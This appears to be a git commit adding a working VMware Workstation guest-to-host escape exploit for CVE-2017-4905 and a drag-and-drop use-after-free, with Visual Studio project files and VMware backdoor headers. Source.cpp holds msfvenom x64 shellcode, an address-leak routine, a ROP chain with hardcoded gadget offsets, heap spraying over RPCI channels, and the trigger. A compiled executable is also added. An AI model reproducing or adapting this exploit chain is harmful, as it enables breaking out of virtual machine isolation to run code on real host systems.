unamer__vmware_escape
commit b994ad39f4f0fc7593bf3c03e651543f5b437b33
Author:     nonick <12728984+unamer@users.noreply.github.com>
AuthorDate: Thu Jun 6 02:04:17 2019 -0700
Commit:     GitHub <noreply@github.com>
CommitDate: Thu Jun 6 02:04:17 2019 -0700

    add CVE-2017-4905 and vmware waf before 12.5.3

diff --git a/CVE-2017-4905_and_uaf/Release/vmware.exe b/CVE-2017-4905_and_uaf/Release/vmware.exe
new file mode 100644
index 0000000..4adb666
Binary files /dev/null and b/CVE-2017-4905_and_uaf/Release/vmware.exe differ
diff --git a/CVE-2017-4905_and_uaf/exploit.gif b/CVE-2017-4905_and_uaf/exploit.gif
new file mode 100644
index 0000000..6796352
Binary files /dev/null and b/CVE-2017-4905_and_uaf/exploit.gif differ
diff --git a/CVE-2017-4905_and_uaf/vmware.sln b/CVE-2017-4905_and_uaf/vmware.sln
new file mode 100644
index 0000000..bc11ab0
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware.sln
@@ -0,0 +1,22 @@
+ï»¿
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio 2013
+VisualStudioVersion = 12.0.21005.1
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "vmware", "vmware\vmware.vcxproj", "{04A931F0-9AFF-42E5-AC5F-35F79E9376E9}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|Win32 = Debug|Win32
+		Release|Win32 = Release|Win32
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{04A931F0-9AFF-42E5-AC5F-35F79E9376E9}.Debug|Win32.ActiveCfg = Debug|Win32
+		{04A931F0-9AFF-42E5-AC5F-35F79E9376E9}.Debug|Win32.Build.0 = Debug|Win32
+		{04A931F0-9AFF-42E5-AC5F-35F79E9376E9}.Release|Win32.ActiveCfg = Release|Win32
+		{04A931F0-9AFF-42E5-AC5F-35F79E9376E9}.Release|Win32.Build.0 = Release|Win32
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+EndGlobal
diff --git a/CVE-2017-4905_and_uaf/vmware/Source.cpp b/CVE-2017-4905_and_uaf/vmware/Source.cpp
new file mode 100644
index 0000000..c61f8b3
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/Source.cpp
@@ -0,0 +1,451 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include "backdoor_def.h"
+#include "message.h"
+//#include "rpcout.h"
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define RPCI_PROTOCOL_NUM       0x49435052 /* 'RPCI' ;-) */
+#define GUEST_RPC_CMD_STR_DND "dnd.transport "
+#define GUEST_RPC_CMD_STR_CP  "copypaste.transport "
+#define MAX_LFH_BLOCK 512
+
+
+
+
+// call calc.exe (winx64) 
+// msfvenom -p windows/x64/exec cMD=calc.exe -e x64/xor -b '\x00' -f c
+// must be shorter than 0x400 bytes
+
+unsigned char shellcode[] =
+"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
+"\xff\xff\x48\xbb\x05\xde\xee\x0c\x93\x45\x60\x5c\x48\x31\x58"
+"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf9\x96\x6d\xe8\x63\xad"
+"\xa0\x5c\x05\xde\xaf\x5d\xd2\x15\x32\x0d\x53\x96\xdf\xde\xf6"
+"\x0d\xeb\x0e\x65\x96\x65\x5e\x8b\x0d\xeb\x0e\x25\x96\x65\x7e"
+"\xc3\x0d\x6f\xeb\x4f\x94\xa3\x3d\x5a\x0d\x51\x9c\xa9\xe2\x8f"
+"\x70\x91\x69\x40\x1d\xc4\x17\xe3\x4d\x92\x84\x82\xb1\x57\x9f"
+"\xbf\x44\x18\x17\x40\xd7\x47\xe2\xa6\x0d\x43\xce\xe0\xd4\x05"
+"\xde\xee\x44\x16\x85\x14\x3b\x4d\xdf\x3e\x5c\x18\x0d\x78\x18"
+"\x8e\x9e\xce\x45\x92\x95\x83\x0a\x4d\x21\x27\x4d\x18\x71\xe8"
+"\x14\x04\x08\xa3\x3d\x5a\x0d\x51\x9c\xa9\x9f\x2f\xc5\x9e\x04"
+"\x61\x9d\x3d\x3e\x9b\xfd\xdf\x46\x2c\x78\x0d\x9b\xd7\xdd\xe6"
+"\x9d\x38\x18\x8e\x9e\xca\x45\x92\x95\x06\x1d\x8e\xd2\xa6\x48"
+"\x18\x05\x7c\x15\x04\x0e\xaf\x87\x97\xcd\x28\x5d\xd5\x9f\xb6"
+"\x4d\xcb\x1b\x39\x06\x44\x86\xaf\x55\xd2\x1f\x28\xdf\xe9\xfe"
+"\xaf\x5e\x6c\xa5\x38\x1d\x5c\x84\xa6\x87\x81\xac\x37\xa3\xfa"
+"\x21\xb3\x44\x29\x44\x60\x5c\x05\xde\xee\x0c\x93\x0d\xed\xd1"
+"\x04\xdf\xee\x0c\xd2\xff\x51\xd7\x6a\x59\x11\xd9\x28\xb5\xd5"
+"\xfe\x53\x9f\x54\xaa\x06\xf8\xfd\xa3\xd0\x96\x6d\xc8\xbb\x79"
+"\x66\x20\x0f\x5e\x15\xec\xe6\x40\xdb\x1b\x16\xac\x81\x66\x93"
+"\x1c\x21\xd5\xdf\x21\x3b\x6f\xf2\x29\x03\x72\x60\xa6\x8b\x0c"
+"\x93\x45\x60\x5c";
+
+
+
+typedef
+#pragma pack(push, 1)
+struct DnDTransportPacketHeader {
+	uint32 type;
+	uint32 seqNum;
+	uint32 totalSize;
+	uint32 payloadSize;
+	uint32 offset;
+	uint8 payload[1];
+}
+#pragma pack(pop)
+DnDTransportPacketHeader;
+
+typedef enum
+{
+	DND_TRANSPORT_PACKET_TYPE_UNKNOWN = 0,
+	DND_TRANSPORT_PACKET_TYPE_SINGLE,
+	DND_TRANSPORT_PACKET_TYPE_REQUEST,
+	DND_TRANSPORT_PACKET_TYPE_PAYLOAD,
+} DND_TRANSPORT_PACKET_TYPE;
+
+
+#define DND_TRANSPORT_PACKET_HEADER_SIZE      (5 * sizeof(uint32))
+/* Close to 64k (maximum guestRpc message size). Leave some space for guestRpc header. */
+#define DND_MAX_TRANSPORT_PACKET_SIZE         ((1 << 16) - 100)
+#define DND_MAX_TRANSPORT_PACKET_PAYLOAD_SIZE (DND_MAX_TRANSPORT_PACKET_SIZE - \
+	DND_TRANSPORT_PACKET_HEADER_SIZE)
+#define DND_MAX_TRANSPORT_LATENCY_TIME        3 * 1000000 /* 3 seconds. */
+
+typedef enum TransportInterfaceType {
+	TRANSPORT_HOST_CONTROLLER_DND = 0,
+	TRANSPORT_HOST_CONTROLLER_CP,
+	TRANSPORT_HOST_CONTROLLER_FT,
+	TRANSPORT_GUEST_CONTROLLER_DND,
+	TRANSPORT_GUEST_CONTROLLER_CP,
+	TRANSPORT_GUEST_CONTROLLER_FT,
+	TRANSPORT_INTERFACE_MAX,
+} TransportInterfaceType;
+
+Message_Channel msgchl;
+
+BOOL rpcstart()
+{
+	return Message_OpenAllocated(RPCI_PROTOCOL_NUM, &msgchl, 0, 0);
+}
+
+Bool rpcstop()
+{
+	return Message_CloseAllocated(&msgchl);
+}
+
+BOOL rpcsend(char *inbuf, size_t inlen, unsigned char**outbuf, size_t *outlen)
+{
+	size_t temp;
+	if (!outlen)
+	{
+		outlen = &temp;
+	}
+	if (Message_Send(&msgchl, (const unsigned char*)inbuf, inlen) == FALSE) {
+		return FALSE;
+	}
+	if (Message_Receive(&msgchl, outbuf, outlen) == FALSE) {
+
+		return FALSE;
+	}
+	if (!*outbuf && !*outlen)
+	{
+		return TRUE;
+	}
+	if (*outlen < 2
+		|| ((strncmp((const char *)*outbuf, "1 ", 2) == 0) == FALSE
+		&& strncmp((const char *)outbuf, "0 ", 2))) {
+		return FALSE;
+	}
+	*outlen -= 2;
+	*outbuf += 2;
+	return TRUE;
+}
+
+BOOL rpcsendstr(char *instr, unsigned char**outbuf, size_t *outlen)
+{
+	size_t inlen = strlen(instr);
+	return rpcsend(instr, inlen, outbuf,outlen);
+}
+void setver4()
+{
+	unsigned char *myReply = 0;
+	size_t myRepLen;
+
+	if (!rpcsend("tools.capability.dnd_version 4", 31, &myReply, &myRepLen))
+	{
+		printf("Error in setver4:%s\n", (char*)myReply);
+		return;
+	}
+
+	if (!rpcsend("vmx.capability.dnd_version", 26, &myReply, &myRepLen))
+	{
+		printf("Error in setver4:%s\n", (char*)myReply);
+		return;
+	}
+//	printf("Current DnD Version %s\n", myReply);
+}
+
+void setver2()
+{
+	unsigned char *myReply = 0;
+	size_t myRepLen;
+
+	if (!rpcsend("tools.capability.dnd_version 2", 31, &myReply, &myRepLen))
+	{
+		printf("Error in setver2:%s\n", (char*)myReply);
+		return;
+	}
+
+	if (!rpcsend("vmx.capability.dnd_version", 26, &myReply, &myRepLen))
+	{
+		printf("Error in setver2:%s\n", (char*)myReply);
+		return;
+	}
+//	printf("Current DnD Version %s\n", myReply);
+}
+
+
+BOOL SetGlobalPointer(__int64 gadget)
+{
+	unsigned char *myReply = 0;
+	size_t myRepLen;
+
+	u_long low = gadget & 0xffffffff, nlow = 0;
+	u_long high = (gadget >> 32), nhigh = 0;;
+
+	nlow = htonl(low);
+	nhigh = htonl(high);
+
+	char tmp[0x100];
+	RtlSecureZeroMemory(tmp, 0x100);
+
+	memcpy(tmp, "unity.window.contents.start \x00\x00\x00\x01\x00\x00\x00\x01\xde\xad\xbe\xef", 40);
+	memcpy(tmp + 40, &nlow, 4);
+	memcpy(tmp + 44, &nhigh, 4);
+	memcpy(tmp + 48, "\x00\x00\x02\x00", 4);
+
+	if (!rpcsend(tmp, 52, &myReply, &myRepLen))
+	{
+		puts((char*)myReply);
+		return FALSE;
+	}
+	return TRUE;
+}
+
+BOOL SendPacket(const uint8 *msg,size_t length)
+{
+	char *rpc = NULL;
+	size_t rpcSize = 0;
+	unsigned char *myReply = 0;
+	size_t myRepLen;
+	const char *cmd =GUEST_RPC_CMD_STR_DND;
+	BOOL ret = true;
+
+	rpcSize = strlen(cmd)+ length;
+	rpc = new char[rpcSize];
+	strcpy_s(rpc, rpcSize,cmd);
+
+	if (length > 0) {
+		memcpy(rpc + strlen(cmd), msg, length);
+	}
+
+	ret= rpcsend(rpc, rpcSize, &myReply, &myRepLen);
+
+	if (!ret)
+	{
+		puts((char*)myReply);
+	}
+	delete (rpc);
+	return ret;
+}
+
+BOOL DnDSendPacket(char *inbuf,size_t inbuflen,uint32 seq,uint32 totalsize,uint32 offset) 
+{
+	DnDTransportPacketHeader *packet;
+	bool ret=false;
+
+	packet = (DnDTransportPacketHeader *)new char[inbuflen + DND_TRANSPORT_PACKET_HEADER_SIZE];
+	packet->type = DND_TRANSPORT_PACKET_TYPE_PAYLOAD;
+	packet->seqNum =seq;
+	packet->totalSize = totalsize;
+	packet->payloadSize = inbuflen;
+	packet->offset = offset;
+
+	memcpy(packet->payload,inbuf,inbuflen);
+
+	ret = SendPacket((uint8*)packet, inbuflen + DND_TRANSPORT_PACKET_HEADER_SIZE);
+	delete packet;
+	return ret;
+}
+
+char *memmem(const void *haystack, size_t haystack_len,
+	const void * const needle, const size_t needle_len)
+{
+	if (haystack == NULL) return NULL; // or assert(haystack != NULL);
+	if (haystack_len == 0) return NULL;
+	if (needle == NULL) return NULL; // or assert(needle != NULL);
+	if (needle_len == 0) return NULL;
+
+	for (char *h = (char*)haystack;
+		haystack_len >= needle_len;
+		++h, --haystack_len) {
+		if (!memcmp(h, needle, needle_len)) {
+			return h;
+		}
+	}
+	return NULL;
+}
+
+uint64 leak()
+{
+	uint64 leaked = 0xffffffffffffffff;
+	while (true)
+	{
+		leaked = 0xffffffffffffffff;
+		DnDSendPacket("testabcd", 8, 0x12345678, 8, 0);
+		char *buf = (char *)infoleak();
+		char* ptr = buf;
+
+		while (1)
+		{
+			if (ptr + 3 > buf + 0x8000 - 3)
+			{
+				break;
+			}
+			ptr = memmem(ptr + 3, 0x8000 - (ptr + 3 - buf), "\x7f\x00\x00", 3);
+
+			if (!ptr)
+			{
+				break;
+			}
+
+			unsigned int gap = ptr - buf;
+			unsigned int low_gap = gap & 0xf;
+
+			if (low_gap == 0x5 || low_gap == 0xd)
+			{
+				if (!memchr(ptr - 5, 0, 6))
+				{
+					uint64 temp = 0;
+					memcpy(&temp, ptr - 5, 8);
+
+					if (temp < leaked)
+					{
+						leaked = temp;
+					}
+				}
+			}
+		}
+		unsigned int temp = leaked & 0xffff;
+		if (temp == 0xeb4b || temp == 0xa66e)
+		{
+			leaked = (leaked & (~0xFFFF)) - 0x20000;
+			break;
+		}
+		else if (temp == 0xa66e)
+		{
+			leaked = (leaked & (~0xFFFF)) - 0x20000;
+			break;
+		}
+		else if (temp == 0x4194)
+		{
+			leaked = (leaked & (~0xFFFF));
+			break;
+		}
+		else
+		{
+			continue;
+		}
+	}
+
+	return leaked;
+}
+
+
+void main(int argc,char**argv)
+{
+	__try {
+		unsigned char *myReply=0;
+		size_t myRepLen;
+		Sleep(3000);
+		if (rpcstart())
+		{
+			char spary2[0x400] = { 0 };
+			sprintf_s(spary2, "guest.upgrader_send_cmd_line_args %s", shellcode);
+			rpcsendstr(spary2, &myReply, &myRepLen);
+
+			uint64 base = leak();
+
+			printf("Base: 0x%llx\n", base);
+
+			uint64 gadget = base + 0x33700, mov_esp_ebx = base + 0x76916;
+			uint64 fake_vt = base + 0xb87100 - 8;
+
+			uint64 rwxmem = base + 0xb309a0;
+			uint64 poprcx = base + 0x61553;
+			uint64 popr8 = base + 0x33d72;
+			uint64 poprax = base + 0x14e5b;
+			uint64 mov_rdx_qword_rax_80 = base + 0x80887;
+			uint64 f_memcpy = base + 0x753ba0;
+
+			uint64 sc_ptr = base + 0xb857e0;
+
+			if (!SetGlobalPointer(gadget))
+			{
+				puts("Error setting global pointer.");
+				__leave;
+			}
+
+
+			uint64 payload[22] = { 0 };
+			uint64 *ppayload = payload;
+			
+			*ppayload++ = fake_vt;
+			*ppayload++ = poprax;
+			*ppayload++ = sc_ptr - 0x80;
+			*ppayload++ = mov_rdx_qword_rax_80;
+			*ppayload++ = popr8;
+			*ppayload++ = sizeof(shellcode) + 8;
+			*ppayload++ = poprcx;
+			*ppayload++ = rwxmem;
+			*ppayload++ = f_memcpy;
+			*ppayload++ = rwxmem;
+
+			payload[20] = mov_esp_ebx;
+
+			setver2();
+			setver4();
+
+			for (int i = 0; i < MAX_LFH_BLOCK; ++i)
+			{
+				setver2();
+				setver4();
+			}
+
+			for (int i = 0; i < MAX_LFH_BLOCK; ++i)
+			{
+				Message_Channel *chan = Message_Open(0x49435052);
+				if (chan == NULL)
+				{
+					puts("Message send error!");
+					Sleep(100);
+				}
+				else
+				{
+					Message_SendSize(chan, 0xb0);
+					Message_Send(chan, (const unsigned char*)payload, 0xa8); //just ret
+					Message_Close(chan);
+				}
+			}
+
+			
+			setver2();
+			setver4();
+		
+
+			Message_Channel *chans[5] = { 0 };
+			for (int i = 0; i < 5; ++i)
+			{
+				chans[i] = Message_Open(0x49435052);
+				if (chans[i])
+				{
+					Message_SendSize(chans[i], 0xb0); //just alloc
+				}
+				else
+				{
+					Message_Close(chans[i - 1]); //keep 1 channel valid
+					chans[i - 1] = 0;
+					break;
+				}
+			}
+			// PrepareLFH();
+			Message_Channel *c = 0;
+
+			for (int i = 0; i < 5; ++i)
+			{
+				if (chans[i])
+				{
+					Message_SendHigh(chans[i], (const unsigned char*)payload, 0xa8);
+					c = chans[i];
+				}
+			}
+
+			
+			rpcsendstr("dnd.enter 123", &myReply, &myRepLen);
+
+//			puts((char*)myReply);
+			puts("Done!");
+		}
+		else
+		{
+			puts("RPC Start Error!");
+		}
+	}
+	__except (GetExceptionInformation() ?
+	EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
+		fprintf(stderr, "Not vm error");
+	}
+}
\ No newline at end of file
diff --git a/CVE-2017-4905_and_uaf/vmware/backdoor.h b/CVE-2017-4905_and_uaf/vmware/backdoor.h
new file mode 100644
index 0000000..56ee684
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/backdoor.h
@@ -0,0 +1,48 @@
+/*********************************************************
+ * Copyright (C) 1999-2016 VMware, Inc. All rights reserved.
+ *
+ * This program is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as published
+ * by the Free Software Foundation version 2.1 and no later version.
+ *
+ * This program is distributed in the hope that it will be useful, but
+ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+ * or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+ * License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public License
+ * along with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * The contents of this file are subject to the terms of the Common
+ * Development and Distribution License (the "License") version 1.0
+ * and no later version.  You may not use this file except in
+ * compliance with the License.
+ *
+ * You can obtain a copy of the License at
+ *         http://www.opensource.org/licenses/cddl1.php
+ *
+ * See the License for the specific language governing permissions
+ * and limitations under the License.
+ *
+ *********************************************************/
+
+/*
+ * backdoor.h --
+ *
+ *    First layer of the internal communication channel between guest
+ *    applications and vmware
+ */
+
+
+#define _BACKDOOR_H_
+
+#include "vm_basic_types.h"
+//#include "vm_assert.h"
+#include "backdoor_def.h"
+#include "backdoor_types.h"
+
+
diff --git a/CVE-2017-4905_and_uaf/vmware/backdoor_def.h b/CVE-2017-4905_and_uaf/vmware/backdoor_def.h
new file mode 100644
index 0000000..f2a35b3
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/backdoor_def.h
@@ -0,0 +1,321 @@
+/*********************************************************
+ * Copyright (C) 1998-2016 VMware, Inc. All rights reserved.
+ *
+ * This program is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as published
+ * by the Free Software Foundation version 2.1 and no later version.
+ *
+ * This program is distributed in the hope that it will be useful, but
+ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+ * or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+ * License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public License
+ * along with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * The contents of this file are subject to the terms of the Common
+ * Development and Distribution License (the "License") version 1.0
+ * and no later version.  You may not use this file except in
+ * compliance with the License.
+ *
+ * You can obtain a copy of the License at
+ *         http://www.opensource.org/licenses/cddl1.php
+ *
+ * See the License for the specific language governing permissions
+ * and limitations under the License.
+ *
+ *********************************************************/
+
+/*
+ * backdoor_def.h --
+ *
+ * This contains backdoor defines that can be included from
+ * an assembly language file.
+ */
+
+
+
+#ifndef _BACKDOOR_DEF_H_
+#define _BACKDOOR_DEF_H_
+
+#define INCLUDE_ALLOW_MODULE
+#define INCLUDE_ALLOW_USERLEVEL
+
+#define INCLUDE_ALLOW_VMCORE
+#define INCLUDE_ALLOW_VMKERNEL
+//#include "includeCheck.h"
+
+/*
+ * If you want to add a new low-level backdoor call for a guest userland
+ * application, please consider using the GuestRpc mechanism instead. --hpreg
+ */
+
+#define BDOOR_MAGIC 0x564D5868
+
+/* Low-bandwidth backdoor port. --hpreg */
+
+#define BDOOR_PORT 0x5658
+
+#define   BDOOR_CMD_GETMHZ      		    1
+/*
+ * BDOOR_CMD_APMFUNCTION is used by:
+ *
+ * o The FrobOS code, which instead should either program the virtual chipset
+ *   (like the new BIOS code does, matthias offered to implement that), or not
+ *   use any VM-specific code (which requires that we correctly implement
+ *   "power off on CLI HLT" for SMP VMs, boris offered to implement that)
+ *
+ * o The old BIOS code, which will soon be jettisoned
+ *
+ *  --hpreg
+ */
+#define   BDOOR_CMD_APMFUNCTION               2 /* CPL0 only. */
+#define   BDOOR_CMD_GETDISKGEO                3
+#define   BDOOR_CMD_GETPTRLOCATION            4
+#define   BDOOR_CMD_SETPTRLOCATION            5
+#define   BDOOR_CMD_GETSELLENGTH              6
+#define   BDOOR_CMD_GETNEXTPIECE              7
+#define   BDOOR_CMD_SETSELLENGTH              8
+#define   BDOOR_CMD_SETNEXTPIECE              9
+#define   BDOOR_CMD_GETVERSION               10
+#define   BDOOR_CMD_GETDEVICELISTELEMENT     11
+#define   BDOOR_CMD_TOGGLEDEVICE             12
+#define   BDOOR_CMD_GETGUIOPTIONS            13
+#define   BDOOR_CMD_SETGUIOPTIONS            14
+#define   BDOOR_CMD_GETSCREENSIZE            15
+#define   BDOOR_CMD_MONITOR_CONTROL          16 /* Disabled by default. */
+#define   BDOOR_CMD_GETHWVERSION             17
+#define   BDOOR_CMD_OSNOTFOUND               18 /* CPL0 only. */
+#define   BDOOR_CMD_GETUUID                  19
+#define   BDOOR_CMD_GETMEMSIZE               20
+#define   BDOOR_CMD_HOSTCOPY                 21 /* Devel only. */
+//#define BDOOR_CMD_SERVICE_VM               22 /* Not in use. Never shipped. */
+#define   BDOOR_CMD_GETTIME                  23 /* Deprecated -> GETTIMEFULL. */
+#define   BDOOR_CMD_STOPCATCHUP              24
+#define   BDOOR_CMD_PUTCHR                   25 /* Disabled by default. */
+#define   BDOOR_CMD_ENABLE_MSG               26 /* Devel only. */
+#define   BDOOR_CMD_GOTO_TCL                 27 /* Devel only. */
+#define   BDOOR_CMD_INITPCIOPROM             28 /* CPL 0 only. */
+//#define BDOOR_CMD_INT13                    29 /* Not in use. */
+#define   BDOOR_CMD_MESSAGE                  30
+#define   BDOOR_CMD_SIDT                     31
+#define   BDOOR_CMD_SGDT                     32
+#define   BDOOR_CMD_SLDT_STR                 33
+#define   BDOOR_CMD_ISACPIDISABLED           34
+//#define BDOOR_CMD_TOE                      35 /* Not in use. */
+#define   BDOOR_CMD_ISMOUSEABSOLUTE          36
+#define   BDOOR_CMD_PATCH_SMBIOS_STRUCTS     37 /* CPL 0 only. */
+#define   BDOOR_CMD_MAPMEM                   38 /* Devel only */
+#define   BDOOR_CMD_ABSPOINTER_DATA          39
+#define   BDOOR_CMD_ABSPOINTER_STATUS        40
+#define   BDOOR_CMD_ABSPOINTER_COMMAND       41
+//#define BDOOR_CMD_TIMER_SPONGE             42 /* Not in use. */
+#define   BDOOR_CMD_PATCH_ACPI_TABLES        43 /* CPL 0 only. */
+//#define BDOOR_CMD_DEVEL_FAKEHARDWARE       44 /* Not in use. */
+#define   BDOOR_CMD_GETHZ                    45
+#define   BDOOR_CMD_GETTIMEFULL              46
+//#define   BDOOR_CMD_STATELOGGER            47 /* Not in use. */
+#define   BDOOR_CMD_CHECKFORCEBIOSSETUP      48 /* CPL 0 only. */
+#define   BDOOR_CMD_LAZYTIMEREMULATION       49 /* CPL 0 only. */
+#define   BDOOR_CMD_BIOSBBS                  50 /* CPL 0 only. */
+//#define BDOOR_CMD_VASSERT                  51 /* Not in use. */
+#define   BDOOR_CMD_ISGOSDARWIN              52
+#define   BDOOR_CMD_DEBUGEVENT               53
+#define   BDOOR_CMD_OSNOTMACOSXSERVER        54 /* CPL 0 only. */
+#define   BDOOR_CMD_GETTIMEFULL_WITH_LAG     55
+#define   BDOOR_CMD_ACPI_HOTPLUG_DEVICE      56 /* Devel only. */
+#define   BDOOR_CMD_ACPI_HOTPLUG_MEMORY      57 /* Devel only. */
+#define   BDOOR_CMD_ACPI_HOTPLUG_CBRET       58 /* Devel only. */
+//#define BDOOR_CMD_GET_HOST_VIDEO_MODES     59 /* Not in use. */
+#define   BDOOR_CMD_ACPI_HOTPLUG_CPU         60 /* Devel only. */
+//#define BDOOR_CMD_USB_HOTPLUG_MOUSE        61 /* Not in use. Never shipped. */
+#define   BDOOR_CMD_XPMODE                   62 /* CPL 0 only. */
+#define   BDOOR_CMD_NESTING_CONTROL          63
+#define   BDOOR_CMD_FIRMWARE_INIT            64 /* CPL 0 only. */
+#define   BDOOR_CMD_FIRMWARE_ACPI_SERVICES   65 /* CPL 0 only. */
+#  define BDOOR_CMD_FAS_GET_TABLE_SIZE        0
+#  define BDOOR_CMD_FAS_GET_TABLE_DATA        1
+#  define BDOOR_CMD_FAS_GET_PLATFORM_NAME     2
+#  define BDOOR_CMD_FAS_GET_PCIE_OSC_MASK     3
+#  define BDOOR_CMD_FAS_GET_APIC_ROUTING      4
+#  define BDOOR_CMD_FAS_GET_TABLE_SKIP        5
+#  define BDOOR_CMD_FAS_GET_SLEEP_ENABLES     6
+#  define BDOOR_CMD_FAS_GET_HARD_RESET_ENABLE 7
+#  define BDOOR_CMD_FAS_GET_MOUSE_HID         8
+#  define BDOOR_CMD_FAS_GET_SMBIOS_VERSION    9
+#define   BDOOR_CMD_SENDPSHAREHINTS          66 /* Not in use. Deprecated. */
+#define   BDOOR_CMD_ENABLE_USB_MOUSE         67
+#define   BDOOR_CMD_GET_VCPU_INFO            68
+#  define BDOOR_CMD_VCPU_SLC64                0
+#  define BDOOR_CMD_VCPU_SYNC_VTSCS           1
+#  define BDOOR_CMD_VCPU_HV_REPLAY_OK         2
+#  define BDOOR_CMD_VCPU_LEGACY_X2APIC_OK     3
+#  define BDOOR_CMD_VCPU_MMIO_HONORS_PAT      4
+#  define BDOOR_CMD_VCPU_RESERVED            31
+#define   BDOOR_CMD_EFI_SERIALCON_CONFIG     69 /* CPL 0 only. */
+#define   BDOOR_CMD_BUG328986                70 /* CPL 0 only. */
+#define   BDOOR_CMD_FIRMWARE_ERROR           71 /* CPL 0 only. */
+#  define BDOOR_CMD_FE_INSUFFICIENT_MEM       0
+#  define BDOOR_CMD_FE_EXCEPTION              1
+#define   BDOOR_CMD_VMK_INFO                 72
+#define   BDOOR_CMD_EFI_BOOT_CONFIG          73 /* CPL 0 only. */
+#  define BDOOR_CMD_EBC_LEGACYBOOT_ENABLED        0
+#  define BDOOR_CMD_EBC_GET_ORDER                 1
+#  define BDOOR_CMD_EBC_SHELL_ACTIVE              2
+#  define BDOOR_CMD_EBC_GET_NETWORK_BOOT_PROTOCOL 3
+#  define BDOOR_CMD_EBC_QUICKBOOT_ENABLED         4
+#define   BDOOR_CMD_GET_HW_MODEL             74 /* CPL 0 only. */
+#define   BDOOR_CMD_GET_SVGA_CAPABILITIES    75 /* CPL 0 only. */
+#define	  BDOOR_CMD_GET_FORCE_X2APIC         76 /* CPL 0 only  */
+#define   BDOOR_CMD_SET_PCI_HOLE             77 /* CPL 0 only  */
+#define   BDOOR_CMD_GET_PCI_HOLE             78 /* CPL 0 only  */
+#define   BDOOR_CMD_GET_PCI_BAR              79 /* CPL 0 only  */
+#define   BDOOR_CMD_SHOULD_GENERATE_SYSTEMID 80 /* CPL 0 only  */
+#define   BDOOR_CMD_READ_DEBUG_FILE          81 /* Devel only. */
+#define   BDOOR_CMD_SCREENSHOT               82 /* Devel only. */
+#define   BDOOR_CMD_INJECT_KEY               83 /* Devel only. */
+#define   BDOOR_CMD_INJECT_MOUSE             84 /* Devel only. */
+#define   BDOOR_CMD_MKS_GUEST_STATS          85 /* CPL 0 only. */
+#  define BDOOR_CMD_MKSGS_RESET               0
+#  define BDOOR_CMD_MKSGS_ADD_PPN             1
+#  define BDOOR_CMD_MKSGS_REMOVE_PPN          2
+#define   BDOOR_CMD_ABSPOINTER_RESTRICT      86
+#define   BDOOR_CMD_GUEST_INTEGRITY          87
+#  define BDOOR_CMD_GI_GET_CAPABILITIES       0
+#  define BDOOR_CMD_GI_SETUP_ENTRY_POINT      1
+#  define BDOOR_CMD_GI_SETUP_ALERTS           2
+#  define BDOOR_CMD_GI_SETUP_STORE            3
+#  define BDOOR_CMD_GI_SETUP_EVENT_RING       4
+#  define BDOOR_CMD_GI_SETUP_NON_FAULT_READ   5
+#  define BDOOR_CMD_GI_ENTER_INTEGRITY_MODE   6
+#  define BDOOR_CMD_GI_EXIT_INTEGRITY_MODE    7
+#  define BDOOR_CMD_GI_RESET_INTEGRITY_MODE   8
+#  define BDOOR_CMD_GI_GET_EVENT_RING_STATE   9
+#  define BDOOR_CMD_GI_CONSUME_RING_EVENTS   10
+#  define BDOOR_CMD_GI_WATCH_MAPPINGS_START  11
+#  define BDOOR_CMD_GI_WATCH_MAPPINGS_STOP   12
+#  define BDOOR_CMD_GI_CHECK_MAPPINGS_NOW    13
+#  define BDOOR_CMD_GI_WATCH_PPNS_START      14
+#  define BDOOR_CMD_GI_WATCH_PPNS_STOP       15
+#  define BDOOR_CMD_GI_SEND_MSG              16
+#  define BDOOR_CMD_GI_TEST_READ_MOB        128
+#  define BDOOR_CMD_GI_TEST_ADD_EVENT       129
+#  define BDOOR_CMD_GI_TEST_MAPPING         130
+#  define BDOOR_CMD_GI_TEST_PPN             131
+#  define BDOOR_CMD_GI_MAX                  131
+#define   BDOOR_CMD_MKSSTATS_SNAPSHOT        88 /* Devel only. */
+#  define BDOOR_CMD_MKSSTATS_START            0
+#  define BDOOR_CMD_MKSSTATS_STOP             1
+#define   BDOOR_CMD_SECUREBOOT               89
+#define   BDOOR_CMD_COPY_PHYSMEM             90 /* Devel only. */
+#define   BDOOR_CMD_MAX                      91
+
+
+/*
+ * IMPORTANT NOTE: When modifying the behavior of an existing backdoor command,
+ * you must adhere to the semantics expected by the oldest Tools who use that
+ * command. Specifically, do not alter the way in which the command modifies
+ * the registers. Otherwise backwards compatibility will suffer.
+ */
+
+/* Nesting control operations */
+
+#define NESTING_CONTROL_RESTRICT_BACKDOOR 0
+#define NESTING_CONTROL_OPEN_BACKDOOR     1
+#define NESTING_CONTROL_QUERY             2
+#define NESTING_CONTROL_MAX               2
+
